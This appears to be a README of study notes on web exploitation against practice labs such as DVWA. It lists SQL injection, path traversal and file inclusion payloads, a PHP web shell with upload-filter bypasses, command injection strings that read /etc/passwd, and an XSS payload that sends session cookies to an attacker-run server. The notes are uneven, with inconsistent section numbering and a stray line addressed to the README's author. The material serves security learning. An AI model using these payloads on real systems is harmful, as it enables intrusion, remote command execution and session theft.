# Web Exploitation Techniques

This repository contains a collection of web exploitation techniques focused on SQL Injection, Directory Traversal, Local File Inclusion, and File Upload Vulnerabilities. The examples and commands provided here can be used for ethical hacking and testing of web application vulnerabilities in controlled environments.

## Table of Contents

1. [Broken Access Control](#broken-access-control)
2. [SQL Injection (SQLi) Examples](#sql-injection-sqli-examples)
3. [Directory Traversal](#directory-traversal)
4. [File Inclusion](#file-inclusion)
5. [File Upload Vulnerabilities](#file-upload-vulnerabilities)
6. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

---

## 1. Broken Access Control

```sh
sudo docker container ps
```

```

#### SQL Injection Example

- **Basic payload**: `' OR 1=1 #`
- **To extract passwords**: `' UNION SELECT user, password FROM users #`

```

**DVWA Example**:

- **Low Security**:

  - Payload: `test' OR 1=1 --`
  - Example: `GET /vulnerabilities/sqli/?id=' OR 1=1 #`

- **Medium Security**:
  - Payload: `1 OR 1=1 #`
  - To extract passwords: `1 UNION SELECT user, password FROM users #`

**SecureBank SQL Injection**:

```sql
' UNION SELECT * FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
```

---

## Directory Traversal

```sh
tar -xvf apache-tomcat-8.5.99.tar.gz
./catalina.sh run
```

### Python Virtual Environment Setup

```sh
python3 -m venv venv
. venv/bin/activate
wfuzz -w wordlist http://localhost:1337/dynamic-app1/?FUZZ=test
```

- **Example to Access Secret File**:
  ```sh
  http://localhost:1337/dynamic-app1/?file=../../../secret.txt
  ```

---

## 2. File Inclusion Vulnerabilities

```sh
/app?page=main&username=<username>
```

#### Local File Inclusion (LFI) Example

- **Low Security**:

  ```sh
  http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
  ```

- **Medium Security**:

  ```sh
  http://localhost/vulnerabilities/fi/?page=....//....//....//etc/passwd
  ```

- **Hard Security**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=file4.php../../../../etc/passwd
  ```

#### PHP Filter

- **Base64 Encoding for Low Security**:

  ```sh
  http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
  ```

  Decode the base64 string to get the `/etc/passwd` content.

---

## 4. File Upload Vulnerabilities

### Level 1 - Unrestricted File Upload

1. **Create a PHP shell script**:
   ```php
   <?php system($_REQUEST['cmd']); ?>
   ```
2. **Execute commands via URL**:
   ```url
   http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami
   ```

### Level 2 - File Extension Check Bypass

1. Intercept the upload request using a tool like Burp Suite.
2. Change `Content-Type` from `application/x-php` to `image/png`.
3. **Execute Commands**:
   ```url
   http://localhost:7070/uploads/level2-thumbnail.php?cmd=whoami
   ```

### Level 3 - Image File Check Bypass

1. **Modify Image File Header**:
   Use a PHP payload in the first part of an image file to bypass checks.
2. **Execute Commands**:
   ```php
   <?php system($_REQUEST['cmd']); ?>
   ```

---

Here's an expanded section on **Command Injection** to add to your README.md file. This section includes an explanation of command injection, example commands, and specific strategies for testing in DVWA at different security levels.

---

## 5. Command Injection

Command Injection vulnerabilities occur when an application allows an attacker to execute arbitrary commands on the server. This can lead to unauthorized access to sensitive information or system compromise. Command Injection is often found in applications that take user input and pass it to system commands without proper validation or sanitization.

### Example Command

To demonstrate a command injection vulnerability, you can execute the following command in a vulnerable application:

```bash
ping -c 1 leonardotamiano.xyz ; whoami
```

In this example, the `ping` command is executed, and the `whoami` command is executed right after it, revealing the current user.

### Docker Command Execution

You can also run commands in a Docker container:

```bash
docker run -p 80:8080 <image_name>
```

### Testing Command Injection in DVWA

**DVWA** (Damn Vulnerable Web Application) provides a safe environment to practice command injection attacks. The security levels in DVWA range from low to impossible, providing different validation challenges.

#### Low Security Level

At this level, the application has minimal security measures in place. You can enter the following command in the ping input field:

```bash
ip-address; cat /etc/passwd; whoami
```

- **Explanation**: The command above will attempt to ping the specified IP address, and if successful, will output the contents of the `/etc/passwd` file followed by the current user.

#### Medium Security Level

In this level, the application applies basic validation to the input. It might block the use of `&&` and `;`. However, you can still exploit the vulnerability using pipes:

```bash
ip | cat /etc/passwd
```

- **Explanation**: The `|` operator allows you to pipe the output of the `ip` command into `cat /etc/passwd`, bypassing the restrictions on `&&` and `;`.

#### High Security Level

At this level, the application implements more stringent security checks, including filtering of common command injection patterns. A possible approach is to check the source code for command injection vectors:

```bash
|whoami
```

- **Explanation**: Here, you use the pipe operator (`|`) without any surrounding spaces to attempt to execute `whoami` in a command chain. This can sometimes evade basic filtering.

#### Impossible Level

In this highest level of security, DVWA employs whitelisting techniques to restrict user input to a predefined list of acceptable commands. Command injection becomes extremely difficult, if not impossible, to execute at this level.

- **Explanation**: Whitelisting only allows specific commands to be executed, preventing any form of command injection.

### Important Notes

- Command Injection can lead to severe security breaches, allowing attackers to gain unauthorized access to sensitive information.
- Always validate and sanitize user inputs to prevent command injection vulnerabilities.
- Use tools like **Burp Suite** for intercepting requests and testing command injection.

---

## 6. Cross-Site Scripting (XSS)

### XSS Overview

XSS is a web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, and other security risks.

### Leaking Session Cookies with XSS (Stored)

Stored XSS persists in the database and is executed whenever the affected page is loaded.

1. **Basic Payload**:
   ```html
   <script>
     alert(22)
   </script>
   ```
2. **Retrieve Cookies via Console**:

   ```javascript
   document.cookie
   ```

3. **Exfiltration Payload**:
   Start a local HTTP server to capture cookies:
   ```bash
   python3 -m http.server 1337
   ```
   Payload to send cookie data to the attacker’s server:
   ```html
   <script>
     var xhr = new XMLHttpRequest()
     xhr.open('GET', `http://localhost:1337/${document.cookie}`, false)
     xhr.send(null)
   </script>
   ```

### Useful Docker Commands

- View running containers:
  ```bash
  docker ps
  ```
- View Docker images:
  ```bash
  docker images
  ```

### XSS (Reflected)

Reflected XSS occurs when malicious scripts are reflected off a web server, typically via URL parameters:

```url
http://example.com/search?query=<script>alert(22)</script>
```

### XSS (DOM-Based)

In DOM-based XSS, the vulnerability lies in the client-side JavaScript code that dynamically updates the page based on user input. Inject JavaScript payloads to test for execution:

```html
<script>
  /* Malicious code here */
</script>
```

---

### Important Notes

- Always validate and sanitize user inputs to prevent vulnerabilities.
- Use tools like **Burp Suite** for intercepting requests and **wfuzz** for fuzzing.
- **Convert special characters to URL encoding** where necessary.

### References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Directory Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)

---

### Disclaimer

These techniques are for educational purposes and should only be used in authorized environments. Unauthorized access or testing without permission is illegal.

---
